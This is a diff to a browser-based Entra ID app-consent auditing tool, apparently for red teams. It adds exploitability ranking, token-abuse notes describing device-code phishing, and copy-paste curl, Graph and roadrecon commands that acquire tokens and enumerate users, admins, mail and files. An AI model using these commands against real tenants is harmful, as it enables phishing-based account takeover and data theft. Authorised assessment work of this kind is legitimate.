@@ -113,6 +113,30 @@
   .mitre-wrap { display:flex; flex-wrap:wrap; gap:6px; }
   .mitre { font-size:11px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.25); color:#fca5a5; padding:3px 8px; border-radius:5px; }
   .mitre strong { color:#ef4444; }
+
+  /* Compact exploitable-signals cell */
+  .sigs { display:flex; flex-wrap:wrap; gap:5px; align-items:center; }
+  .sig { font-size:11px; padding:1px 7px; border-radius:4px; font-weight:600; border:1px solid transparent; white-space:nowrap; }
+  .sig-pub { background:rgba(239,68,68,.15); color:var(--danger); border-color:rgba(239,68,68,.3); }
+  .sig-imp { background:rgba(245,158,11,.15); color:var(--warn); border-color:rgba(245,158,11,.3); }
+  .sig-uri { background:rgba(239,68,68,.10); color:var(--danger); border-color:rgba(239,68,68,.25); }
+  .sig-all { background:rgba(239,68,68,.12); color:#ef4444; border-color:rgba(239,68,68,.25); }
+  .sig-sup { background:rgba(249,115,22,.14); color:#f97316; border-color:rgba(249,115,22,.3); }
+  .sig-none { color:var(--muted); font-size:12px; }
+  /* Priority badge */
+  .prio { font-size:13px; font-weight:700; padding:2px 10px; border-radius:11px; display:inline-block; min-width:26px; text-align:center; }
+  /* Application dossier (moved off the main table) */
+  .dossier { background:rgba(255,255,255,.02); border:1px solid var(--border); border-radius:8px; padding:14px 16px; margin:0 0 16px; }
+  .dossier h5 { margin:0 0 10px; font-size:11px; text-transform:uppercase; letter-spacing:.05em; color:var(--accent); }
+  .dgrid2 { display:grid; grid-template-columns:repeat(auto-fit,minmax(240px,1fr)); gap:14px; }
+  .dfield { font-size:12.5px; line-height:1.6; color:var(--text); }
+  .dfield .k { color:var(--muted); text-transform:uppercase; font-size:10px; letter-spacing:.05em; display:block; margin-bottom:3px; }
+  .dfield .res { color:var(--text); font-weight:500; }
+  /* Operator command blocks */
+  .opcmd { background:#07070f; border:1px solid var(--border); border-radius:6px; padding:10px 34px 10px 12px; font-family:ui-monospace,Consolas,monospace; font-size:11.5px; line-height:1.6; color:#c8d0e0; overflow-x:auto; white-space:pre; margin:0 0 12px; position:relative; }
+  .opcmd .cmt { color:#6b7280; }
+  .copybtn { position:absolute; top:6px; right:6px; background:var(--panel-2); border:1px solid var(--border); color:var(--muted); font-size:10px; padding:2px 8px; border-radius:4px; cursor:pointer; }
+  .copybtn:hover { color:var(--accent); border-color:var(--accent); }
 </style>
 </head>
 <body>
@@ -227,14 +251,9 @@
   <thead>
     <tr>
       <th data-sort="displayName">Application</th>
-      <th data-sort="accessLevel">Access Level</th>
-      <th>Auth Config</th>
-      <th data-sort="tenancy">Tenancy</th>
-      <th>Recon Capabilities</th>
-      <th>Delegated Permissions</th>
-      <th>Application Permissions</th>
-      <th data-sort="publisherName">Publisher</th>
-      <th data-sort="createdDateTime">Created</th>
+      <th data-sort="priority">Priority</th>
+      <th data-sort="accessLevel">Access</th>
+      <th>Exploitable Signals</th>
     </tr>
   </thead>
   <tbody id="rows"></tbody>
@@ -245,7 +264,8 @@
   Runs entirely in your browser &middot; Read-only &middot; Data from Microsoft Graph with delegated
   <code>Application.Read.All</code> + <code>DelegatedPermissionGrant.Read.All</code>.<br>
   Shows enterprise apps (servicePrincipalType = Application) where appRoleAssignmentRequired = false AND
-  at least one oauth2PermissionGrant with consentType = AllPrincipals. Hover any capability badge for details.
+  at least one oauth2PermissionGrant with consentType = AllPrincipals. Main table shows only exploitable signals, ranked by Priority;
+  expand any app for the full dossier, token-abuse notes, and operator recon commands.
 </footer>
 
 <!-- MSAL Browser 2.38.3 -->
@@ -271,7 +291,7 @@
   var msalInstance = null;
   var account = null;
   var cache = { results: null };
-  var sortState = { key:'accessLevel', dir:-1 };
+  var sortState = { key:'priority', dir:-1 };
 
   try {
     var saved = JSON.parse(localStorage.getItem('entraReconCfg') || '{}');
@@ -365,6 +385,39 @@
       return ci !== 0 ? ci : b.cap.sev - a.cap.sev;
     });
     return caps;
+  }
+
+  // -------------------- Target prioritization --------------------
+  // Exploitability score: severity of what it can reach + how easily an operator can turn it into a token.
+  function priorityScore(r){
+    var s = (r.accessLevel || 0) * 2;                                   // 0–8  what it can reach
+    if(r.allowPublicClient) s += 4;                                     // token with no secret — prime
+    if(r.implicitGrant) s += 2;                                         // token leaks to URL/logs
+    if((r.redirectUris||[]).some(function(u){ return redirectRisk(u); })) s += 2;
+    if(r.delegatedDetail.some(function(d){ return d.consentType==='AllPrincipals'; })) s += 2; // tenant-wide
+    var aud = AUDIENCE_INFO[r.signInAudience] || AUDIENCE_INFO['_inferred'];
+    if(aud.tenancy==='multi' && !r.isFirstPartyMicrosoft && !r.verifiedPublisherName) s += 3;   // supply chain
+    if(r.caps.some(function(c){ return c.cap.cat==='privilege'; })) s += 3;
+    if(r.caps.some(function(c){ return c.cap.cat==='content'; })) s += 2;
+    return s;
+  }
+  function priorityTier(s){ return s>=15?4 : s>=10?3 : s>=6?2 : s>=1?1 : 0; }
+
+  // Compact "exploitable signals" cell for the main table — only the offensively relevant flags.
+  function signalsCell(r){
+    var s = [];
+    if(r.allowPublicClient) s.push('<span class="has-tip"><span class="sig sig-pub">🔓 Public client</span><span class="tip"><strong>allowPublicClient = true</strong><br>Device-code / ROPC token flows with no client secret — device-code phishing vector (T1528).</span></span>');
+    if(r.implicitGrant) s.push('<span class="has-tip"><span class="sig sig-imp">💧 Implicit</span><span class="tip"><strong>Implicit grant</strong><br>Access tokens emitted to the URL fragment — leak via history/referrer/logs; not individually revocable.</span></span>');
+    var risky = (r.redirectUris||[]).filter(function(u){ return redirectRisk(u); });
+    if(risky.length) s.push('<span class="has-tip"><span class="sig sig-uri">🔗 '+risky.length+' risky URI'+(risky.length!==1?'s':'')+'</span><span class="tip"><strong>Risky redirect URIs</strong><br>'+risky.map(function(u){ var rk=redirectRisk(u); return escHtml(u.length>50?u.slice(0,50)+'…':u)+': '+escHtml(rk.reason); }).join('<br>')+'</span></span>');
+    if(r.delegatedDetail.some(function(d){ return d.consentType==='AllPrincipals'; })) s.push('<span class="has-tip"><span class="sig sig-all">👥 Tenant-wide</span><span class="tip"><strong>AllPrincipals consent</strong><br>Admin-consented for every user — any tenant user can silently obtain a token.</span></span>');
+    var aud = AUDIENCE_INFO[r.signInAudience] || AUDIENCE_INFO['_inferred'];
+    if(aud.tenancy==='multi' && !r.isFirstPartyMicrosoft && !r.verifiedPublisherName) s.push('<span class="has-tip"><span class="sig sig-sup">🌍 Unverified multi-tenant</span><span class="tip"><strong>Supply-chain surface</strong><br>External publisher, unverified — a vendor compromise yields tokens valid in this tenant (T1199).</span></span>');
+    var cats = {}; r.caps.forEach(function(c){ cats[c.cap.cat] = true; });
+    ['privilege','content','security'].forEach(function(cat){
+      if(cats[cat]) s.push('<span class="badge cat-'+cat+'" style="margin:0">'+cat.charAt(0).toUpperCase()+cat.slice(1)+'</span>');
+    });
+    return s.length ? '<div class="sigs">'+s.join('')+'</div>' : '<span class="sig-none">no exploitable signals</span>';
   }
 
   // -------------------- Helpers --------------------
@@ -644,6 +697,8 @@
       }
     });
 
+    results.forEach(function(r){ r.priority = priorityScore(r); r.priorityTier = priorityTier(r.priority); });
+
     cache.results = results;
     clearMsg();
     updateDashboard();
@@ -691,8 +746,9 @@
     var fTenancy = el('f-tenancy').value;
     if(fTenancy) rows = rows.filter(function(r){ return r.tenancy === fTenancy; });
     rows.sort(function(a,b){
-      var av = a[sortState.key] != null ? a[sortState.key] : '';
-      var bv = b[sortState.key] != null ? b[sortState.key] : '';
+      var av = a[sortState.key], bv = b[sortState.key];
+      if(typeof av === 'number' && typeof bv === 'number') return (av - bv) * sortState.dir;
+      av = av != null ? av : ''; bv = bv != null ? bv : '';
       return String(av).localeCompare(String(bv)) * sortState.dir;
     });
     return rows;
@@ -701,81 +757,14 @@
   function render(){
     var rows = filtered();
     el('rows').innerHTML = rows.map(function(r){
-      var created = r.createdDateTime ? new Date(r.createdDateTime).toISOString().slice(0,10) : '';
-      var sevBadge = '<span class="badge ' + SEV_CLASS[r.accessLevel] + '">' + SEV_LABELS[r.accessLevel] + '</span>';
-      var capHtml = r.caps.length
-        ? r.caps.map(function(c){
-            return '<span class="has-tip"><span class="badge cat-' + c.cap.cat + '">' + escHtml(c.cap.label) + '</span>'
-              + '<span class="tip"><strong>' + escHtml(c.cap.label) + '</strong><br>' + escHtml(c.cap.detail) + '</span></span>';
-          }).join('')
-        : '<span style="color:var(--muted);font-size:12px">No recognized capabilities</span>';
-      var delegatedPermsHtml = r.delegatedDetail.map(function(d){
-        var typeBadge = d.consentType === 'AllPrincipals'
-          ? '<span style="font-size:10px;padding:1px 5px;border-radius:4px;background:rgba(239,68,68,0.12);color:#ef4444;font-weight:600;margin-right:5px;white-space:nowrap">All users</span>'
-          : '<span style="font-size:10px;padding:1px 5px;border-radius:4px;background:rgba(148,163,184,0.12);color:#94a3b8;font-weight:600;margin-right:5px;white-space:nowrap">'+(d.principalCount||'?')+' user'+(d.principalCount!==1?'s':'')+'</span>';
-        return '<div>'+typeBadge+'<span class="res">'+escHtml(d.resourceName)+':</span> '+escHtml(d.scopes)+'</div>';
-      }).join('') || '<span style="color:var(--muted);font-size:12px">—</span>';
-      var appPermsHtml = '';
-      if(r.appPermissions && r.appPermissions.length){
-        var byRes = {};
-        r.appPermissions.forEach(function(p){ (byRes[p.resourceName]=byRes[p.resourceName]||[]).push(p); });
-        appPermsHtml = Object.keys(byRes).map(function(rn){
-          var vals = byRes[rn].map(function(p){ return escHtml(p.roleValue||p.roleName); }).join(', ');
-          return '<div><span class="res">'+escHtml(rn)+':</span> '+vals+'</div>';
-        }).join('');
-      } else {
-        appPermsHtml = '<span style="color:var(--muted);font-size:12px">—</span>';
-      }
-      var authParts = [];
-      if(r.allowPublicClient)
-        authParts.push('<span class="has-tip">'
-          +'<span style="display:inline-block;font-size:11px;padding:1px 6px;border-radius:4px;background:rgba(239,68,68,0.15);color:var(--danger);font-weight:600;border:1px solid rgba(239,68,68,0.25)">🔓 Public client</span>'
-          +'<span class="tip"><strong>allowPublicClient = true</strong><br>Device code, ROPC, and native-app token flows are enabled with no client secret. Any user can initiate a token request for this app — a viable device-code phishing vector (T1528).</span>'
-          +'</span>');
-      if(r.implicitGrant)
-        authParts.push('<span class="has-tip">'
-          +'<span style="display:inline-block;font-size:11px;padding:1px 6px;border-radius:4px;background:rgba(245,158,11,0.15);color:var(--warn);font-weight:600;border:1px solid rgba(245,158,11,0.25)">💧 Implicit grant</span>'
-          +'<span class="tip"><strong>Implicit grant enabled</strong><br>Access tokens are issued directly from /authorize without an authorization code exchange. Tokens are visible in browser history, referrer headers, and server logs — and cannot be selectively revoked.</span>'
-          +'</span>');
-      var totalUris = (r.redirectUris||[]).length;
-      var riskyUris = (r.redirectUris||[]).filter(function(u){ return redirectRisk(u); });
-      if(totalUris){
-        var uriTipLines = riskyUris.map(function(u){ var rk=redirectRisk(u); return (rk.level==='critical'?'🔴':rk.level==='high'?'🟠':'🟡')+' '+escHtml(u.length>55?u.slice(0,55)+'…':u)+': '+escHtml(rk.reason); }).join('<br>');
-        var uriLabel = totalUris+' URI'+(totalUris!==1?'s':'');
-        var uriColor = riskyUris.length ? 'var(--danger)' : 'var(--muted)';
-        if(riskyUris.length) uriLabel += ' <span style="color:var(--danger);font-weight:700">'+riskyUris.length+'⚠</span>';
-        authParts.push('<span class="has-tip">'
-          +'<span style="font-size:12px;color:'+uriColor+'">🔗 '+uriLabel+'</span>'
-          +(uriTipLines ? '<span class="tip"><strong>Risky redirect URIs</strong><br>'+uriTipLines+'</span>' : '')
-          +'</span>');
-      }
-      var authCell = authParts.length
-        ? '<div style="display:flex;flex-direction:column;gap:4px;align-items:flex-start">'+authParts.join('')+'</div>'
-        : '<span style="color:var(--muted);font-size:12px">—</span>';
-      var audInfo = AUDIENCE_INFO[r.signInAudience] || AUDIENCE_INFO['_inferred'];
-      var vpLine = (!r.isFirstPartyMicrosoft)
-        ? (r.verifiedPublisherName
-            ? '<span style="display:inline-block;font-size:10px;padding:0 5px;border-radius:3px;background:rgba(16,185,129,.12);color:var(--ok);border:1px solid rgba(16,185,129,.3)">✅ '+escHtml(r.verifiedPublisherName)+'</span>'
-            : '<span style="display:inline-block;font-size:10px;padding:0 5px;border-radius:3px;background:rgba(245,158,11,.1);color:var(--warn);border:1px solid rgba(245,158,11,.25)">⚠️ Unverified</span>')
-        : '';
-      var tenancyCell = '<span class="has-tip">'
-        +'<div style="display:flex;flex-direction:column;gap:3px;align-items:flex-start">'
-        +'<span style="display:inline-block;font-size:11px;padding:1px 6px;border-radius:4px;background:'+audInfo.bg+';color:'+audInfo.color+';font-weight:600;border:1px solid '+audInfo.border+'">'+escHtml(audInfo.label)+'</span>'
-        +vpLine
-        +'</div>'
-        +'<span class="tip"><strong>'+escHtml(audInfo.label)+'</strong><br>'+escHtml(audInfo.tip)+'</span>'
-        +'</span>';
+      var sevBadge  = '<span class="badge ' + SEV_CLASS[r.accessLevel] + '">' + SEV_LABELS[r.accessLevel] + '</span>';
+      var prioBadge = '<span class="prio ' + SEV_CLASS[r.priorityTier] + '" title="Exploitability score — severity of reach + ease of token acquisition">' + r.priority + '</span>';
       return '<tr>'
         + '<td><div class="app-name"><a href="' + escHtml(r.portalUrl) + '" target="_blank" rel="noopener">' + escHtml(r.displayName) + '</a></div><div class="appid">' + escHtml(r.appId) + '</div>'
-        + '<button class="xpath" data-xpath="' + r.id + '">' + (r.allowPublicClient ? '⚠️ ' : '') + '▼ Attack Path</button></td>'
+        + '<button class="xpath" data-xpath="' + r.id + '">' + (r.allowPublicClient ? '⚠️ ' : '') + '▼ Dossier / Attack Path</button></td>'
+        + '<td>' + prioBadge + '</td>'
         + '<td>' + sevBadge + '</td>'
-        + '<td>' + authCell + '</td>'
-        + '<td>' + tenancyCell + '</td>'
-        + '<td>' + capHtml + '</td>'
-        + '<td><div class="raw-perms">' + delegatedPermsHtml + '</div></td>'
-        + '<td><div class="raw-perms">' + appPermsHtml + '</div></td>'
-        + '<td>' + escHtml(r.publisherName||'—') + '</td>'
-        + '<td>' + escHtml(created) + '</td>'
+        + '<td>' + signalsCell(r) + '</td>'
         + '</tr>';
     }).join('');
     el('stat-visible').textContent = rows.length;
@@ -785,7 +774,7 @@
 
   function exportCsv(){
     var rows = filtered();
-    var cols = ['displayName','appId','accessLevel','reconCapabilities','reconCategories','delegatedPermissions','applicationPermissions','publisherName','isFirstPartyMicrosoft','createdDateTime','portalUrl'];
+    var cols = ['displayName','appId','priority','accessLevel','publicClient','implicitGrant','reconCapabilities','reconCategories','delegatedPermissions','applicationPermissions','publisherName','isFirstPartyMicrosoft','createdDateTime','portalUrl'];
     var lines = [cols.join(',')];
     rows.forEach(function(r){
       var caps  = r.caps.map(function(c){ return c.cap.label; }).join(' | ');
@@ -793,7 +782,7 @@
       r.caps.forEach(function(c){ if(!catSeen[c.cap.cat]){ catSeen[c.cap.cat]=true; catList.push(c.cap.cat); } });
       var delegated = r.delegatedDetail.map(function(d){ return d.resourceName + ': ' + d.scopes; }).join(' | ');
       var appPerms = (r.appPermissions||[]).map(function(p){ return p.resourceName + ': ' + (p.roleValue||p.roleName); }).join(' | ');
-      var row = [r.displayName, r.appId, SEV_LABELS[r.accessLevel], caps, catList.join(' | '), delegated, appPerms, r.publisherName, r.isFirstPartyMicrosoft, r.createdDateTime, r.portalUrl];
+      var row = [r.displayName, r.appId, r.priority, SEV_LABELS[r.accessLevel], !!r.allowPublicClient, !!r.implicitGrant, caps, catList.join(' | '), delegated, appPerms, r.publisherName, r.isFirstPartyMicrosoft, r.createdDateTime, r.portalUrl];
       lines.push(row.map(function(v){
         if(v==null) v=''; v=String(v).replace(/"/g,'""');
         return /[,"\n]/.test(v) ? '"'+v+'"' : v;
@@ -861,6 +850,134 @@
     content:   'Mail, files, calendar, and Teams messages across all users — direct data exfiltration channel for sensitive documents, credentials in email, and real-time communication interception.',
     apps:      'Full app landscape, OAuth grant map, and device management — identification of additional over-privileged apps or service accounts for further OAuth token acquisition.',
   };
+
+  // Scope -> exact Graph recon call an operator would run with the acquired token.
+  var RECON_CMD = {
+    'Directory.Read.All':               'GET /v1.0/users?$select=displayName,userPrincipalName,userType&$top=999   # full user dump',
+    'User.Read.All':                    'GET /v1.0/users?$select=displayName,userPrincipalName,jobTitle,mobilePhone&$top=999',
+    'Group.Read.All':                   'GET /v1.0/groups?$expand=members($select=userPrincipalName)&$top=999',
+    'GroupMember.Read.All':             'GET /v1.0/groups?$expand=members&$top=999',
+    'RoleManagement.Read.All':          'GET /v1.0/roleManagement/directory/roleAssignments?$expand=principal   # who is admin',
+    'RoleManagement.Read.Directory':    'GET /v1.0/roleManagement/directory/roleAssignments?$expand=principal',
+    'PrivilegedAccess.Read.AzureAD':    'GET /v1.0/roleManagement/directory/roleEligibilitySchedules   # PIM-eligible admins',
+    'Policy.Read.All':                  'GET /v1.0/identity/conditionalAccess/policies   # map MFA / CA gaps',
+    'AuditLog.Read.All':                'GET /v1.0/auditLogs/signIns?$top=200   # legacy-auth / no-MFA targets',
+    'IdentityRiskyUser.Read.All':       "GET /v1.0/identityProtection/riskyUsers?$filter=riskLevel eq 'high'",
+    'SecurityEvents.Read.All':          'GET /v1.0/security/alerts_v2?$top=100',
+    'Mail.Read':                        'GET /v1.0/me/messages?$top=50   # /users/{id}/messages with app perms',
+    'Mail.ReadWrite':                   'GET /v1.0/me/messages   ·   POST /v1.0/me/sendMail',
+    'Files.Read.All':                   'GET /v1.0/drives   ·   GET /v1.0/sites?search=*   # enumerate then pull',
+    'Sites.Read.All':                   'GET /v1.0/sites?search=*',
+    'Chat.Read.All':                    'GET /v1.0/chats?$top=50',
+    'ChannelMessage.Read.All':          'GET /v1.0/teams   then /teams/{id}/channels/{id}/messages',
+    'Application.Read.All':             'GET /v1.0/applications?$select=appId,displayName,keyCredentials,passwordCredentials',
+    'DelegatedPermissionGrant.Read.All':'GET /v1.0/oauth2PermissionGrants?$top=999',
+    'UserAuthenticationMethod.Read.All':'GET /v1.0/users/{id}/authentication/methods   # MFA method per user'
+  };
+
+  function allGrantedScopes(r){
+    var out = [], seen = {};
+    r.delegatedDetail.forEach(function(d){ d.scopes.split(/[\s,]+/).filter(Boolean).forEach(function(s){ if(!seen[s]){ seen[s]=true; out.push(s); } }); });
+    if(r.appPermissions) r.appPermissions.forEach(function(p){ if(p.roleValue && !seen[p.roleValue]){ seen[p.roleValue]=true; out.push(p.roleValue); } });
+    return out;
+  }
+
+  function cmdBlock(title, body){
+    return '<div class="dfield" style="margin-bottom:4px"><span class="k">'+escHtml(title)+'</span></div>'
+      + '<div class="opcmd"><button class="copybtn" data-copy>copy</button>'+body+'</div>';
+  }
+
+  // Application dossier — everything moved off the compact main table.
+  function buildDossier(r){
+    var capHtml = r.caps.length
+      ? r.caps.map(function(c){ return '<span class="badge cat-'+c.cap.cat+'" title="'+escHtml(c.cap.detail)+'">'+escHtml(c.cap.label)+'</span>'; }).join(' ')
+      : '<span class="xmuted">No recognized capabilities</span>';
+    var delHtml = r.delegatedDetail.length
+      ? r.delegatedDetail.map(function(d){
+          var t = d.consentType==='AllPrincipals'
+            ? '<span class="sig sig-all">All users</span> '
+            : '<span class="sig" style="background:rgba(148,163,184,.12);color:#94a3b8">'+(d.principalCount||'?')+' user'+(d.principalCount!==1?'s':'')+'</span> ';
+          return '<div>'+t+'<span class="res">'+escHtml(d.resourceName)+':</span> '+escHtml(d.scopes)+'</div>';
+        }).join('')
+      : '<span class="xmuted">—</span>';
+    var appHtml;
+    if(r.appPermissions && r.appPermissions.length){
+      var byRes = {}; r.appPermissions.forEach(function(p){ (byRes[p.resourceName]=byRes[p.resourceName]||[]).push(p); });
+      appHtml = Object.keys(byRes).map(function(rn){ return '<div><span class="res">'+escHtml(rn)+':</span> '+byRes[rn].map(function(p){ return escHtml(p.roleValue||p.roleName); }).join(', ')+'</div>'; }).join('');
+    } else appHtml = '<span class="xmuted">—</span>';
+    var aud = AUDIENCE_INFO[r.signInAudience] || AUDIENCE_INFO['_inferred'];
+    var pub = r.isFirstPartyMicrosoft ? 'Microsoft (first-party)'
+      : (r.verifiedPublisherName ? '✅ '+escHtml(r.verifiedPublisherName)
+      : ((r.publisherName?escHtml(r.publisherName)+' · ':'')+'⚠️ unverified'));
+    var authTxt = [];
+    if(r.allowPublicClient) authTxt.push('Public client');
+    if(r.implicitGrant) authTxt.push('Implicit grant');
+    authTxt.push((r.redirectUris||[]).length+' redirect URI'+((r.redirectUris||[]).length!==1?'s':''));
+    var created = r.createdDateTime ? new Date(r.createdDateTime).toISOString().slice(0,10) : '—';
+    return '<div class="dossier"><h5>📋 Application Dossier</h5>'
+      + '<div class="dfield" style="margin-bottom:12px"><span class="k">Recon capabilities</span>'+capHtml+'</div>'
+      + '<div class="dgrid2">'
+      + '<div class="dfield"><span class="k">Delegated permissions</span><div class="raw-perms">'+delHtml+'</div></div>'
+      + '<div class="dfield"><span class="k">Application permissions</span><div class="raw-perms">'+appHtml+'</div></div>'
+      + '<div class="dfield"><span class="k">Tenancy</span>'+escHtml(aud.label)+'</div>'
+      + '<div class="dfield"><span class="k">Publisher</span>'+pub+'</div>'
+      + '<div class="dfield"><span class="k">Auth config</span>'+escHtml(authTxt.join(' · '))+'</div>'
+      + '<div class="dfield"><span class="k">Created</span>'+created+'</div>'
+      + '<div class="dfield"><span class="k">Portal</span><a href="'+escHtml(r.portalUrl)+'" target="_blank" rel="noopener" style="color:var(--accent)">Open in Entra ↗</a></div>'
+      + '</div></div>';
+  }
+
+  // Token theft & abuse — how you'd actually turn this app into access.
+  function buildAbuse(r){
+    var notes = [];
+    var aud = AUDIENCE_INFO[r.signInAudience] || AUDIENCE_INFO['_inferred'];
+    if(r.allowPublicClient) notes.push('<li><strong>Acquisition — device-code phishing (T1528):</strong> no client secret required. Present the device-code prompt to a target; on approval you hold a token carrying every consented scope, plus a refresh token for persistence.</li>');
+    if(r.implicitGrant) notes.push('<li><strong>Acquisition — implicit-grant leak:</strong> access tokens land in the redirect URL fragment — harvest from browser history, referrer headers, or proxy/server logs. They cannot be individually revoked.</li>');
+    if(!r.allowPublicClient && !r.implicitGrant) notes.push('<li><strong>Acquisition:</strong> confidential client — needs interactive consent as a user, or a stolen refresh token / session cookie to mint access tokens.</li>');
+    if(r.delegatedDetail.some(function(d){ return d.consentType==='AllPrincipals'; })) notes.push('<li><strong>Reach — tenant-wide:</strong> AllPrincipals consent means any user in the tenant can silently obtain a token; no per-user consent prompt stands in the way.</li>');
+    if(aud.tenancy==='multi' && !r.isFirstPartyMicrosoft && !r.verifiedPublisherName) notes.push('<li><strong>Supply chain (T1199):</strong> external, unverified publisher. Compromising the vendor tenant yields tokens valid here without ever touching your directory.</li>');
+    var cats = {}; r.caps.forEach(function(c){ (cats[c.cap.cat]=cats[c.cap.cat]||[]).push(c.cap.label); });
+    var grants = Object.keys(cats).map(function(cat){ return '<strong>'+cat+':</strong> '+escHtml(cats[cat].join(', ')); });
+    if(grants.length) notes.push('<li><strong>What the token grants:</strong> '+grants.join(' · ')+'.</li>');
+    var seen = {}, esc = [];
+    allGrantedScopes(r).forEach(function(s){ if(ESCALATION_MAP[s] && !seen[s]){ seen[s]=true; esc.push(ESCALATION_MAP[s]); } });
+    if(esc.length) notes.push('<li><strong>Next hop:</strong> '+escHtml(esc[0])+(esc.length>1?' <span class="xmuted">(+'+(esc.length-1)+' more pivots below)</span>':'')+'</li>');
+    if(!notes.length) notes.push('<li class="xmuted">No standout token-abuse primitive — access is bounded by the consented scopes, but still usable for recon.</li>');
+    return '<div class="xsec" style="margin-top:16px"><h5>💀 Token Theft &amp; Abuse</h5><ul class="xlist">'+notes.join('')+'</ul></div>';
+  }
+
+  // Operator recon commands — copy-paste primitives.
+  function buildOperator(r){
+    var scopes = allGrantedScopes(r);
+    var blocks = [];
+    if(r.allowPublicClient){
+      var scopeStr = scopes.slice(0,6).join(' ') || 'https://graph.microsoft.com/.default';
+      blocks.push(cmdBlock('Acquire a token — device-code (public client, no secret)',
+        '<span class="cmt"># 1) request a device code</span>\n'
+        + 'curl -s https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode \\\n'
+        + '  -d client_id=' + escHtml(r.appId) + ' \\\n'
+        + '  --data-urlencode "scope=' + escHtml(scopeStr) + ' offline_access"\n'
+        + '<span class="cmt"># 2) present user_code to the target, then poll for the token</span>\n'
+        + 'curl -s https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token \\\n'
+        + '  -d grant_type=urn:ietf:params:oauth:grant-type:device_code \\\n'
+        + '  -d client_id=' + escHtml(r.appId) + ' -d device_code=$DEVICE_CODE'));
+    } else {
+      blocks.push(cmdBlock('Acquire a token — auth-code / consent (confidential client)',
+        '<span class="cmt"># public-client flows are off — drive interactive consent as the target, capture the code at the redirect URI</span>\n'
+        + 'https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize?client_id=' + escHtml(r.appId) + '\n'
+        + '  &response_type=code&response_mode=query\n'
+        + '  &scope=' + escHtml(encodeURIComponent(scopes.slice(0,4).join(' ') || 'https://graph.microsoft.com/.default'))));
+    }
+    var reconLines = scopes.map(function(s){ return RECON_CMD[s] ? '<span class="cmt"># '+escHtml(s)+'</span>\n'+escHtml(RECON_CMD[s]) : null; }).filter(Boolean);
+    if(reconLines.length) blocks.push(cmdBlock('Graph recon — run with the acquired token (Authorization: Bearer …)', reconLines.join('\n')));
+    blocks.push(cmdBlock('ROADtools — pull & browse the directory offline',
+      '<span class="cmt"># gather everything this app can see, then explore in the GUI</span>\n'
+      + 'roadrecon auth --device-code -c ' + escHtml(r.appId) + '\n'
+      + 'roadrecon gather && roadrecon-gui'));
+    return '<div class="xsec" style="margin-top:16px"><h5>🧰 Operator Recon Commands</h5>'
+      + '<p class="xmuted">Copy-paste primitives — replace <code>{tenant}</code> with the target tenant id/domain. Placeholders are intentionally inert; use only where you are authorised.</p>'
+      + blocks.join('') + '</div>';
+  }
 
   function redirectRisk(uri){
     if(!uri) return null;
@@ -1038,16 +1155,20 @@
         +'<ul class="xlist" style="color:var(--text)">'+tRisks.join('')+'</ul></div>';
     }
 
+    var prioBadge = ' <span class="prio '+SEV_CLASS[r.priorityTier||0]+'" style="vertical-align:middle" title="Exploitability score">Priority '+(r.priority||0)+'</span>';
     return '<div class="xpanel">'
-      +'<h4>🎯 Exploitation Path — '+escHtml(r.displayName)+pubBadge+tenancyBadge+verifiedBadge
+      +'<h4>🎯 Exploitation Path — '+escHtml(r.displayName)+prioBadge+pubBadge+tenancyBadge+verifiedBadge
       +'<span style="font-size:11px;font-weight:400;margin-left:12px;color:var(--muted)">'+escHtml(r.appId)+'</span></h4>'
+      +buildDossier(r)
       +authSection
       +tenancySection
+      +buildAbuse(r)
       +'<div class="xgrid">'
       +'<div class="xsec"><h5>💥 Blast Radius</h5>'+blastHtml+'</div>'
       +'<div class="xsec"><h5>⬆️ Escalation Pivots</h5>'+escHtml2+'</div>'
       +'<div class="xsec"><h5>🛡️ Remediation</h5>'+remHtml+'</div>'
       +'</div>'
+      +buildOperator(r)
       +'<div style="margin-top:16px"><div class="xsec"><h5>🔴 MITRE ATT&amp;CK Techniques</h5>'+mitreHtml+'</div></div>'
       +'</div>';
   }
@@ -1060,7 +1181,7 @@
       existing.remove();
       if(btn){
         var r2 = (cache.results||[]).find(function(x){ return x.id===rowId; });
-        btn.textContent = (r2 && r2.allowPublicClient ? '⚠️ ' : '')+'▼ Attack Path';
+        btn.textContent = (r2 && r2.allowPublicClient ? '⚠️ ' : '')+'▼ Dossier / Attack Path';
       }
       return;
     }
@@ -1073,11 +1194,11 @@
     detailTr.id = detailId;
     detailTr.className = 'detail-row';
     var td = document.createElement('td');
-    td.colSpan = 9;
+    td.colSpan = 4;
     td.innerHTML = buildAttackPath(r);
     detailTr.appendChild(td);
     tr.parentNode.insertBefore(detailTr, tr.nextSibling);
-    btn.textContent = (r.allowPublicClient ? '⚠️ ' : '')+'▲ Hide Path';
+    btn.textContent = (r.allowPublicClient ? '⚠️ ' : '')+'▲ Hide';
   }
 
   // -------------------- Wire up --------------------
@@ -1119,6 +1240,19 @@
     render();
   });
   el('rows').addEventListener('click', function(e){
+    var cb = e.target.closest('[data-copy]');
+    if(cb){
+      var pre = cb.closest('.opcmd');
+      if(pre){
+        var clone = pre.cloneNode(true);
+        var b = clone.querySelector('.copybtn'); if(b) b.remove();
+        var text = clone.innerText;
+        if(navigator.clipboard && navigator.clipboard.writeText){
+          navigator.clipboard.writeText(text).then(function(){ cb.textContent='copied'; setTimeout(function(){ cb.textContent='copy'; }, 1200); });
+        }
+      }
+      return;
+    }
     var btn = e.target.closest('.xpath');
     if(!btn) return;
     var rowId = btn.getAttribute('data-xpath');
